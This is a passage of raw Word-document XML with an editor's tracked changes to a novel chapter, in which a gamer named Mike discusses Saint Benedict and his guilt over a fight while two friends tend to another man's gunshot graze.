          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the shelf above her TV, </w:t>
      </w:r>
      <w:ins w:id="1591" w:author="TextVet" w:date="2016-03-19T13:46:00Z">
        <w:r w:rsidR="007F04E5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>inspecting</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1592" w:author="TextVet" w:date="2016-03-19T13:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007F04E5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the grinning human skull with the taxidermic snake </w:t>
      </w:r>
      <w:ins w:id="1593" w:author="TextVet" w:date="2016-03-19T13:45:00Z">
        <w:r w:rsidR="00C82F68">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>oozing from</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1594" w:author="TextVet" w:date="2016-03-19T13:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C82F68">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>coming out of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> its eye socket.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Natalie asked with piqued curiosity, “What do you do for a living?”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protect the People of the Lowland Plains from the armies of the Orc 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when you’re not busy doing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stock groceries at the Safeway in Queen Anne.”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teach you the Rules of Saint Benedict at the Safeway?” she asked with a wry smile. “Are your coworkers monks?”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he answered. “They’re fellow peasants.”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quote you just recited. That’s by Saint Benedict. Where do you know it from?”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the Wizard’s Compendium rulebook, in the chapter on Necromancy,” he answered. “It’s the caption under an illustration of a skull with a snake in its eye.”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 you know anything about Saint Benedict?” she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was a Level 20 Priest?” said Mike.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Natalie hoisted her body back up to standing and navigated across the room. “Benedict is the patron saint of students and scholars. He’s the one who codified the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>rules that all monks should live by. You’ve heard that monks take vows of celibacy, silence, and poverty, right? Do you know why?”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“To avoid sin through temptation,” answered Mike.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smiled. She took the skull from the shelf and headed back to the couch. “It’s actually deeper than that. The main purpose of the Rules of Saint Benedict is to remove the ego from the study of the divine. They’re designed to get a monk’s mind out of its own way.” She cleared off a cushion and sat down beside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“See, Benedict knew,” she continued, “that a curious mind is prone to self-sabotage. It learns something incompletely, and then moves on too quickly, trying to build more knowledge on top of an incomplete foundation. It thinks, ‘Yeah yeah, I get it</w:t>
      </w:r>
      <w:ins w:id="1595" w:author="TextVet" w:date="2016-03-19T13:50:00Z">
        <w:r w:rsidR="00452D56">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1596" w:author="TextVet" w:date="2016-03-19T13:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00452D56">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I know how this works,’ when it really doesn’t. The purpose of the Rules of Saint Benedict is to make sure that the monk is examining himself at every moment of his life, always checking his own assumptions, always seeking knowledge, never presuming to have any. Makes sense,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“True knowledge begins in knowing that you know nothing,” Mike recited. “An unexamined life is not worthy of being lived by a human being.”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Socrates!” Natalie said gleefully.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said Mike. “I read tons of him and Plato and Aristotle when The Titans expansion pack came out for Age of Mythology.”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giggled.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no joy in Mike’s face or tone. Slowly, he reached toward Natalie and took the skull from her hands. He held it before his face and gazed into its eye sockets.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tried to kill a man tonight,” he said emptily.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room fell silent.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almost succeeded.”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said softly, “You saved our lives back there,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added, “Yeah, Mike. You did the right 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said nothing. In the quiet tension, Natalie scooted closer and put an arm around him. He leaned into the hug, welcoming the contact.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“Did I?” Mike finally replied. “Did I really? Because it doesn’t feel like it. I don’t feel righteous. I don’t feel like I won. Where’s my gold pieces? Where’s my experience points? Where’s that sense of accomplishment? You know… You know that feeling you get when you beat a big boss in a video game? It’s like this little burst of stuff that your brain squirts out, telling you, ‘Yay! You win! Good job! Whatever you just did, keep doing it!’ You know what I’m talking about?”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answered, “Heh, yes. That stuff is called dopamine.”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I’m not getting it,” said Mike. “I’m trying to make myself feel it, but it’s just not working. You know, I wish I could honest-to-God convince myself that this is all just some D&amp;D campaign. Because if it’s all just fantasy</w:t>
      </w:r>
      <w:ins w:id="1597" w:author="TextVet" w:date="2016-03-19T13:52:00Z">
        <w:r w:rsidR="00D0503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then I can handle it. It’s all fun and exciting</w:t>
      </w:r>
      <w:ins w:id="1598" w:author="TextVet" w:date="2016-03-19T13:53:00Z">
        <w:r w:rsidR="00563B6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and what I just did was epic and I should be proud of myself. But if it’s not, then…”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Natalie clapped her hand on Mike’s thigh. “Okay, big </w:t>
      </w:r>
      <w:ins w:id="1599" w:author="TextVet" w:date="2016-03-19T13:53:00Z">
        <w:r w:rsidR="00574F15">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>g</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1600" w:author="TextVet" w:date="2016-03-19T13:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00574F15">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>b</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>uy, listen up,” she said brightly. “I’ll take you to Swedish. They’ll fix your nose and give you a CT scan. I’m going to help you through this. I’ll personally make sure you’re okay. I need to go change, and then we’ll head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stood up from the couch and glided cheerfully toward her bedroom.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she passed by, Tina heard her humming.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“Glad to see you’re happy,” Tina said with a trace of resentment.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responded in a sing-song whisper, “You failed to mention over the phone that this guy is </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fucking awesooooome</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>!” She proceeded into the bedroom and rummaged through her closet.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followed and closed the door behind her. From the pile of blankets on the bed, a pair of feline eyes watched her. “Did I mention that I was almost kidnapped by the Russian mob tonight?”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giggled, “Sorry, T, I know I’ve been ignoring you. I…” She saw Tina’s eyes. Her face turned ashen. “Oh my god. You’re serious.”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been a busy night,” said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wrapped her ample arms around her friend. “What happened?”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“I’m still processing, honestly. One moment I’m was at work, bored shitless as usual. Next thing I know, some goon is waving a gun at me… Nat, if these guys hadn’t shown up, I’d be in a dungeon somewhere right now. Or dead.”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shook her head sagely. “First chance we get, T, we’re performing a rite of gratitude. Up</w:t>
      </w:r>
      <w:del w:id="1601" w:author="TextVet" w:date="2016-03-19T13:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004C62FA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>p</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>! No arguing! You owe it. Your guides brought you protection tonight — the least you can do is light a candle to acknowledge your good fortune. Besides… </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, for one, am incredibly thankful that there was something or someone out there, looking out for my friend.” She turned her attention to the clothes littering her floor, and fished out a pair of black Spanx. “Is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who this Mike guy fought today?” Natalie’s voice was strained as she pulled the girdle over her hips. “A Russian hitman? And he </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>won</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“Damn it, Nat!”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“Sorry! It’s just… that’s… pretty cool.” She hoisted herself into a gray dress. “You’re telling me those doughy dweebs in my living room are actually an undercover ninja squad?”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That got a chuckle out of Tina. “Not exactly. They were total ass-clowns. It was like watching </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1602" w:author="TextVet" w:date="2016-03-19T13:58:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>The Bourne Identity</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> starring The Three Stooges. The other guy, the tall geeky one? He’s injured too. He’s lost blood — I think a bullet grazed his shoulder.”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looked a little pale, but I figured it’s just nerd-skin. I’ll check him out. He fought?”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was mostly a distraction,” said Tina. “He had this machine… It was like something out of a really low-budget sci-fi movie, all held together with Velcro and duct tape</w:t>
      </w:r>
      <w:ins w:id="1603" w:author="TextVet" w:date="2016-03-19T14:00:00Z">
        <w:r w:rsidR="00F91345">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1604" w:author="TextVet" w:date="2016-03-19T14:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F91345">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605" w:author="TextVet" w:date="2016-03-19T14:00:00Z">
        <w:r w:rsidR="00F91345">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1606" w:author="TextVet" w:date="2016-03-19T14:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F91345">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>L</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ike he built it himself.”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“Technogeeky</w:t>
      </w:r>
      <w:ins w:id="1607" w:author="TextVet" w:date="2016-03-19T14:02:00Z">
        <w:r w:rsidR="00911494">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1608" w:author="TextVet" w:date="2016-03-19T14:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00911494">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609" w:author="TextVet" w:date="2016-03-19T14:02:00Z">
        <w:r w:rsidR="00911494">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>s</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1610" w:author="TextVet" w:date="2016-03-19T14:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00911494">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>S</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ounds like your type,” </w:t>
      </w:r>
      <w:del w:id="1611" w:author="TextVet" w:date="2016-03-19T14:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006E738C">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Natalie</w:t>
      </w:r>
      <w:ins w:id="1612" w:author="TextVet" w:date="2016-03-19T14:03:00Z">
        <w:r w:rsidR="006E738C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> ventured</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. She examined her</w:t>
      </w:r>
      <w:ins w:id="1613" w:author="TextVet" w:date="2016-03-19T14:02:00Z">
        <w:r w:rsidR="00BE13AB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>self</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1614" w:author="TextVet" w:date="2016-03-19T14:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BE13AB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> face</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the mirror of an obscenely cluttered vanity and dabbed her face with foundation.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“Please. I don’t do old men,” said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you don’t do </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>men</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> at all,” Natalie retorted. “You do boys. Besides, I know you. If you don’t find yourself a rebound, you’ll be giving Roger a drunken bootie call before you can say ‘walk of shame’.”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“Hey, I have more willpower than that!” </w:t>
      </w:r>
      <w:del w:id="1615" w:author="TextVet" w:date="2016-03-19T14:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E56344">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Tina</w:t>
      </w:r>
      <w:ins w:id="1616" w:author="TextVet" w:date="2016-03-19T14:05:00Z">
        <w:r w:rsidR="00E56344">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> semi-snapped</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Natalie eyed her skeptically.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my god, shut up!” Tina suddenly got very interested in the sleeve of her cardigan, which was stained with Danny’s blood. She took it off and threw it into Natalie’s closet. “Nat, if I didn’t know better, I’d say you were pressuring me into hooking up with the first do</w:t>
      </w:r>
      <w:del w:id="1617" w:author="TextVet" w:date="2016-03-19T14:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00323A07">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able guy to come along just so you can hear me tell dirty stories about someone besides Roger for a change. Maybe what you should be focusing on is creating some dirty stories of your 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crossed her arms. “Oh, we will have </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>none</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> of that, you hear? I’m the only clinical psychiatrist in the room, so I’ll be the only one doing any clinical psychiatrizing.”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bam! I got a little truthy there, didn’t I?” Tina teased.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="001842FA" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1618" w:author="TextVet" w:date="2016-03-19T14:07:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Scoffing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1619" w:author="TextVet" w:date="2016-03-19T14:07:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="001842FA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>With a laugh</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, Natalie finished adjusting her dress and makeup. “How do I look?”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“Smashing. But your new crush is potentially brain-damaged, so he probably won’t notice.”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“You’ve still got keys, right?” asked Natalie. “Do you want to come with me to Swedish, or should I leave you here with your new boyfriend? There’s Jack Daniels in the pantry.”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“Subtle, Nat. Real subtle. I think I’ll stick around, but only because I want to see what’s all the fuss about this vial.”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reached into a drawer and pulled out a blood pressure cuff, a stethoscope, and a stopwatch. “You still remember how to use these?”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tossed the tools into Tina’s hands and shoved her out to the living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had taken Natalie’s place beside Mike on the couch, keeping him engaged in light conversation. Danny waited quietly on a stool near the kitchen.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barked Natalie. “Take your clothes off.”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jumped uneasily.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girls approached him. Natalie circled him, carrying clothes and first aid, and pulled on a pair of plastic gloves. Tina stood by with the sphygmomanometer.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Hesitantly, Danny pulled off his flannel and t-shirt. They were caked with crusted blood. </w:t>
      </w:r>
      <w:ins w:id="1620" w:author="TextVet" w:date="2016-03-19T14:09:00Z">
        <w:r w:rsidR="0071469B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>A</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1621" w:author="TextVet" w:date="2016-03-19T14:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0071469B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>There was a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> three-inch-long tear </w:t>
      </w:r>
      <w:ins w:id="1622" w:author="TextVet" w:date="2016-03-19T14:10:00Z">
        <w:r w:rsidR="00404DC7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>zig</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1623" w:author="TextVet" w:date="2016-03-19T14:09:00Z">
        <w:r w:rsidR="007B215A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>zagg</w:t>
        </w:r>
        <w:r w:rsidR="0071469B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">ed </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>across his left shoulder</w:t>
      </w:r>
      <w:del w:id="1624" w:author="TextVet" w:date="2016-03-19T14:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00404DC7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, as though cut with a serrated knife</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expertly cleaned the wound and dressed it in gauze and adhesive bandages.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took Danny’s wrist and held his arm out so she could slide on the</w:t>
      </w:r>
      <w:del w:id="1625" w:author="TextVet" w:date="2016-03-19T14:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C14BFE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> blood</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> pressure cuff. </w:t>
      </w:r>
      <w:ins w:id="1626" w:author="TextVet" w:date="2016-03-19T14:11:00Z">
        <w:r w:rsidR="00C02149">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>H</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1627" w:author="TextVet" w:date="2016-03-19T14:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C02149">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Sh</w:delText>
        </w:r>
